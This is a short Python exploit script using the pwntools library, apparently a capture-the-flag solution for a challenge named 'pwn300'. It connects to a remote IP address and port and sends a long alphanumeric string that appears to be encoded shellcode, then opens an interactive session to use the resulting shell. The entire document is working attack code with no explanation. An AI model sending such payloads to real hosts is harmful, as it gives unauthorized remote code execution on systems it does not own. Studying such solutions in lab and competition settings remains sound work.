from pwn import*

io = process("./pwn300")
io = remote("54.153.19.139",5256)
io.sendline("Rh0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M15103e0y4s3c1n0x0H8K2D1K3L7N2l0Y2v7O0g0K2C0e2l5L0w2w14164x0z1m3r0V070v")
io.interactive()
